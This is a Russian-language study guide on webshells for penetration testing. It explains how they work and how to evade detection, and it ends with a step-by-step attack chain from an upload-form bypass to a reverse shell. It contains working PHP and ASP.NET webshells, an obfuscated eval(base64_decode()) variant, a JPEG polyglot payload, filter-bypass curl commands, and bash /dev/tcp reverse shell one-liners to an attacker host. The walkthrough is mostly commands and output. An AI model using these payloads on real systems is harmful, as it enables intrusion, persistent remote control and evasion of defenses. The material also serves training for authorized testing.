# Webshell: инструмент удалённого доступа через веб-сервер

## 1. Контекст и базовые понятия

Webshell — это размещаемый на веб-сервере скрипт (как правило, на PHP, ASP.NET, JSP, Python или Perl), который позволяет удалённо выполнять команды операционной системы через HTTP(S)-запросы. В отличие от легитимного серверного кода, webshell не содержит бизнес-логики, а реализует интерфейс управления хостом, что превращает скомпрометированный веб-сервер в точку постоянного присутствия злоумышленника или тестировщика. В рамках пентеста webshell обычно используется на этапе *получения начального доступа* и закрепления (*persistence*) после успешной эксплуатации уязвимостей загрузки файлов, включений (LFI/RFI) или инъекций команд.

Согласно MITRE ATT&CK, техника [Web Shell (T1505.003)](https://attack.mitre.org/techniques/T1505/003) относится к тактике Persistence и заключается в размещении серверного скрипта на общедоступном веб-сервере для обеспечения шлюза в сеть. Важно отличать webshell от других форм удалённого доступа, которые также применяются в тестировании на проникновение:

| Тип доступа | Инициатор соединения | Механизм | Типичный сценарий | Ограничения |
|-------------|----------------------|----------|-------------------|-------------|
| **Webshell** | Атакующий (через HTTP-клиент) | Скрипт на веб-сервере исполняет команды ОС, передавая результат в HTTP-ответе | После загрузки файла на сервер через уязвимость, тестировщик обращается к `http://target/shell.php?cmd=id` | Требует работающего веб-сервера; взаимодействие через HTTP (не интерактивный shell); легко обнаруживается по сигнатурам в логах |
| **Reverse shell** | Целевой хост (инициирует исходящее соединение) | Целевая система запускает клиентское ПО (например, `bash -i >& /dev/tcp/attacker/443 0>&1`), подключаясь к слушателю атакующего | После RCE или через webshell, для обхода брандмауэров, блокирующих входящие соединения | Необходим listener на стороне атакующего; исходящий трафик может контролироваться; более высокая интерактивность |
| **Bind shell** | Атакующий | Целевая система открывает слушающий порт, к которому подключается атакующий | Используется, когда исходящие соединения запрещены, но порт на сервере доступен извне | Часто блокируется фаерволом; легко детектируется сетевыми IDS/IPS |

Как видно, webshell — это, прежде всего, приложение на уровне веб-сервера, не требующее отдельного сетевого сокета, что позволяет ему «прятаться» в легитимном веб-трафике. Однако он, как правило, не обеспечивает полноценного интерактивного терминала; для этого после разведки тестировщик часто загружает на хост полноценный reverse shell.

На практике webshell применяется для:
- выполнения команд ОС и сбора информации о системе (`whoami`, `uname -a`, `ipconfig`);
- навигации по файловой системе, чтения и изменения файлов;
- загрузки дополнительных инструментов (бэкдоров, эксплоитов для локального повышения привилегий);
- перенаправления трафика и туннелирования (pivoting) во внутреннюю сеть;
- поддержания постоянного доступа даже после перезагрузки сервера.

Тематика этического применения строго очерчена: все примеры в данном конспекте предназначены для авторизованного тестирования в лабораторных средах и пентестов по контракту.

## 2. Внутреннее устройство веб-шеллов

Веб-шелл функционирует благодаря способности серверных языков программирования напрямую взаимодействовать с операционной системой. Языки, наиболее часто используемые для создания веб-шеллов:

- **PHP** — самый распространённый благодаря простоте и встроенным функциям вроде `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`.
- **ASP.NET (ASPX, C#)** — через `System.Diagnostics.Process.Start` или `eval` в классическом ASP.
- **JSP/Java** — использует `Runtime.getRuntime().exec()`.
- **Python** (в связке с веб-фреймворками) — модуль `subprocess` или `os.system`.
- **Perl** — функции `system`, `exec`, обратные кавычки.

Базовый принцип одинаков: скрипт принимает произвольные входные данные (обычно через параметры HTTP-запроса — GET, POST, Cookie), передаёт их в функцию-исполнитель команд и возвращает результат клиенту. Простейший однострочный webshell на PHP может выглядеть так:

```php
<?php system($_GET['cmd']); ?>
```

Несмотря на кажущуюся тривиальность, даже такая строка предоставляет полный командный доступ к серверу. Более продвинутые оболочки, такие как [WSO](https://github.coventry.ac.uk/pages/CUEH/245CT/2_LinuxAndShells/RCE), [c99](https://blog.securelayer7.net/web-shell) или [China Chopper](https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html), предлагают графический веб-интерфейс с файловым менеджером, редактором БД, загрузчиком файлов и поддержкой плагинов. С точки зрения пентестера веб-шеллы удобно классифицировать по функциональности и сложности обнаружения:

- **Минималистичные (one-liners):** не более нескольких десятков символов, используют прямые вызовы `system`/`exec`. Легко создаются «на лету» и трудно детектируются статическими сигнатурами, если закодированы.
- **Функциональные (feature-rich):** содержат полноценный интерфейс, обфускаторы, возможность работы с файлами через веб-морду. Обычно имеют большой размер и множество строк, что упрощает сигнатурное обнаружение.
- **Обфусцированные:** код зашифрован (base64, XOR, gzip) и распаковывается динамически при помощи `eval()` или аналогичных конструкций. Затрудняет анализ антивирусами и WAF.
- **Туннельные/прокси-шеллы:** используют веб-сокеты или HTTP-туннелирование (например, [reGeorg](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF) для обхода ограничений сети) для организации прокси-соединения во внутреннюю сеть.

С точки зрения исполнения команд, PHP предоставляет несколько функций, различающихся по способу возврата данных и поведению в отношении стандартных потоков. Знание этих различий критично для выбора подходящего вектора во время теста, а также для понимания, какие из них блокируются защитными механизмами.

| Функция PHP | Возвращаемое значение | Вывод в stdout | Уровень детектируемости | Примечание |
|-------------|-----------------------|----------------|--------------------------|------------|
| `system()` | Последняя строка вывода | Да, напрямую в браузер | Высокий | Удобна для быстрой отладки, легко сигнатурится WAF |
| `exec()` | Массив строк (или последняя строка, если без массива) | Нет (только если явно не выводить) | Средний | Возвращает результат в переменную, вывод скрыт |
| `shell_exec()` | Строка (весь вывод) или `null` при ошибке | Нет | Средний | Аналог обратных кавычек (`` `cmd` ``) |
| `passthru()` | `void` (выводит сырой бинарный поток) | Да, в браузер | Высокий | Полезна для бинарных данных и интерактивных программ |
| `popen()` | Указатель на файловый дескриптор | Нет | Низкий | Двунаправленное взаимодействие с процессом |
| `proc_open()` | Ресурс процесса | Нет | Низкий | Гибкое управление потоками ввода/вывода |
| `eval()` | Выполняет PHP-код, переданный строкой | Зависит от кода | Высокий (если unchecked) | Часто используется в обфусцированных конструкциях |

Для платформы ASP.NET характерно использование `System.Diagnostics.Process`:

```csharp
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
```

Аналогичные конструкции на JSP задействуют `Runtime.getRuntime().exec(request.getParameter("cmd"))`.

Структурно любой веб-шелл можно представить как композицию трёх компонентов:

1. **Интерфейс ввода:** парсинг параметров HTTP-запроса (`$_GET`, `$_POST`, `$_REQUEST`, `php://input`).
2. **Исполнительный движок:** одна или несколько функций, преобразующих строку в команду ОС.
3. **Интерфейс вывода:** отображение результата клиенту (эхо, JSON, обёрнутый HTML).

В обфусцированных вариантах добавляется слой дешифровки/распаковки, который усложняет статический анализ. Например, код может быть закодирован base64 и выполнен через `eval(base64_decode($payload))`, где `$payload` передан в POST.

Для тестировщика понимание внутреннего устройства позволяет подбирать или генерировать шелл, адаптированный под конкретные ограничения среды: отключённые функции, фильтрацию ввода, контроль целостности.

## 3. Применение веб-шеллов в пентесте

В реальных тестах веб-шелл редко является самоцелью — это промежуточный инструмент, который обеспечивает командную строку на целевом веб-сервере и открывает путь к дальнейшим шагам. Типовая последовательность действий пентестера выглядит так:

1. **Эксплуатация уязвимости загрузки файлов.** Если веб-приложение позволяет загрузить файл и не фильтрует расширения должным образом, можно отправить PHP-скрипт. Обход типовых проверок: двойное расширение (`shell.php.jpg`), обход MIME-типа (изменение Content-Type на `image/jpeg`), использование расширений типа `.pht`, `.phtml`, `.php5`, если разрешены.
2. **Использование включений файлов.** Если уязвимость LFI позволяет выполнить произвольный файл, можно загрузить webshell в логи веб-сервера или в сессионную переменную и подключить её через `include()`.
3. **Инъекция команд.** При наличии command injection в веб-приложении можно напрямую записать webshell в веб-директорию, например: `echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php`.
4. **Эксплуатация десериализации.** Если приложение небезопасно десериализует данные, можно создать объект-гаджет, который при раскручивании вызывает `system()`.

После размещения файла шелла тестировщик взаимодействует с ним через обычный HTTP-клиент. Для минималистичного однострочника достаточно `curl`:

```bash
curl -X GET "http://target.com/uploads/shell.php?cmd=id"
```

Вывод:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Для более функциональных оболочек существуют специализированные клиенты. Например, **Weevely** — генератор обфусцированных PHP-шеллов с интерактивной консолью и модулями:

```bash
weevely generate hunter2 /tmp/agent.php
weevely http://target.com/agent.php hunter2
```

После подключения доступны модули разведки (`:system.info`, `:file.ls`), поиска привилегий (`:audit.suidsgid`) и даже дампа баз данных.

**AntSword** (наследник China Chopper) — кроссплатформенный графический клиент с поддержкой разнообразных кодировок и обходом ограничений. Он позволяет управлять множеством шеллов одновременно, загружать/скачивать файлы, редактировать их на лету.

Типичные операции, проводимые через webshell:
- **Разведка:** определение версии ОС, ядра, запущенных процессов, прав пользователя, сетевых интерфейсов:
  ```bash
  curl http://target.com/shell.php?cmd=uname+-a
  curl http://target.com/shell.php?cmd=ip+addr
  ```
- **Поиск чувствительных файлов:** пароли, конфигурационные файлы, ключи SSH.
- **Загрузка дополнительных утилит:** например, бинарников для повышения привилегий (`linpeas.sh`), reverse shell клиентов, туннелей. Передача файла на сервер через webshell может быть реализована через `wget` или `curl` с внешнего сервера, либо с использованием POST-загрузки в функциональных оболочках.
- **Эскалация до интерактивного сеанса:** запуск reverse shell или bind shell. Через webshell часто выполняют `bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'`, чтобы получить полноценный терминал.

Обход защитных механизмов — важная часть практической работы. Веб-шеллы могут детектироваться:
- сигнатурным анализом WAF/IDS (строки `system`, `exec`, `eval` в параметрах);
- антивирусным сканированием файлов на сервере;
- мониторингом поведения (аномальный исходящий трафик, `wget` от `www-data`).

Методы обхода:
- **Шифрование трафика:** передача команд внутри base64-encoded строки, которую скрипт декодирует перед выполнением:
  ```php
  <?php eval(base64_decode($_POST['c'])); ?>
  ```
  Команда отправляется в теле POST, закодированная в base64.
- **Фрагментация и замена функций:** использование переменных-функций (`$f='sys'.'tem'; $f($cmd);`), динамический вызов через `array_map`.
- **Эмуляция картинок:** вставка шелл-кода в EXIF-заголовки JPEG и включение файла через LFI.
- **Протокол HTTPS:** весь обмен происходит внутри шифрованного канала, что исключает анализ сетевыми IDS.

Применение веб-шеллов в пентесте требует постоянной адаптации под конкретную среду: отключённые опасные функции (`disable_functions` в PHP), ограничения на запись в директории, файрволлы. Поэтому типичный арсенал тестировщика включает генераторы обфусцированных шеллов, коллекции готовых скриптов для разных платформ и ручные модификации кода «на лету».

## 4. Сквозной практический пример: от уязвимости загрузки до командной оболочки

**Исходные условия.**  
Веб-приложение на PHP с формой загрузки аватара пользователя. Фильтр проверяет расширение файла по whitelist (`jpg`, `png`, `gif`), но обработка имени файла не проверяет вложенные расширения. Сервер Apache с mod_php, директория загрузок `/var/www/html/uploads/` доступна через веб. Цель: получить командный интерфейс на сервере.

### Шаг 1: Создание полезной нагрузки

Создаём файл с двойным расширением `avatar.php.jpg`, содержащий минималистичный веб-шелл:

```php
<?php system($_REQUEST['cmd']); ?>
```

Примечание: использование `$_REQUEST` позволяет передавать параметр как в GET, так и в POST, что добавляет гибкости при обходе фильтрации параметров веб-сервером.

### Шаг 2: Обход проверки типа файла

Форма загрузки ожидает изображение. Если приложение проверяет только Content-Type, можно отправить тот же скрипт с подменённым заголовком. Используем `curl` для имитации браузерной загрузки:

```bash
curl -X POST -F "file=@avatar.php.jpg;type=image/jpeg" http://target.com/upload.php
```

Если фильтр дополнительно анализирует содержимое (магические байты), можно добавить в начало скрипта байты JPEG: `FF D8 FF E0`. Тогда файл начнётся с заголовка изображения, но PHP-интерпретатор проигнорирует бинарные данные и выполнит код после `<?php`. Модифицированный шелл:

```php
ÿØÿá...<?php system($_REQUEST['cmd']); ?>
```

Для генерации такого файла используем `echo -e` или `printf`:

```bash
printf '\xff\xd8\xff\xe0<?php system($_REQUEST["cmd"]); ?>' > avatar.php.jpg
```

### Шаг 3: Загрузка на сервер

После отправки формы сервер сохраняет файл под именем `avatar.php.jpg`. Из-за того, что Apache сконфигурирован обрабатывать `.php` даже в середине имени (AddHandler application/x-httpd-php .php), файл будет исполнен как PHP-скрипт при обращении.

Выполняем загрузку:

```bash
curl -X POST -F "file=@avatar.php.jpg" http://target.com/upload.php
```

Ожидаемый ответ: `{"status":"success","filename":"avatar.php.jpg"}`.

### Шаг 4: Доступ к веб-шеллу и выполнение команд

Проверяем работоспособность, выполнив команду `id`:

```bash
curl http://target.com/uploads/avatar.php.jpg?cmd=id
```

Вывод:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Исследуем файловую систему и права:

```bash
curl "http://target.com/uploads/avatar.php.jpg?cmd=ls+-la+/var/www/"
```

Вывод:
```
total 12
drwxr-xr-x 3 root   root   4096 Jan  1  2024 .
drwxr-xr-x 5 root   root   4096 Jan  1  2024 ..
drwxr-xr-x 2 www-data www-data 4096 Jan  1  2024 html
-rw-r--r-- 1 root   root    101 Jan  1  2024 config.php
```

Видно, что пользователь `www-data` имеет доступ на запись только в папку `html` и `uploads`. Это даёт возможность загрузить дополнительные инструменты.

### Шаг 5: Повышение до интерактивного reverse shell

Веб-шелл неудобен для длительной работы, поэтому инициируем reverse shell на наш listener. На атакующей машине поднимаем netcat:

```bash
nc -lvnp 4444
```

Через webshell запускаем команду, которая перенаправит bash на наш IP (10.0.0.1):

```bash
curl "http://target.com/uploads/avatar.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261'"
```

В listener приходит соединение:

```bash
Connection from 192.168.1.100:55555
bash: no job control in this shell
www-data@target:/var/www/html/uploads$
```

Теперь тестировщик имеет полноценную интерактивную сессию, может запускать терминальные утилиты, искать векторы эскалации привилегий и двигаться по сети.

**Что демонстрирует пример:** типичную цепочку пентеста — уязвимость загрузки файлов, обход слабых фильтров, размещение и использование веб-шелла, переход к reverse shell для комфортного управления. Каждый шаг подкреплён конкретными командами и артефактами, воспроизводимыми в лабораторной среде.
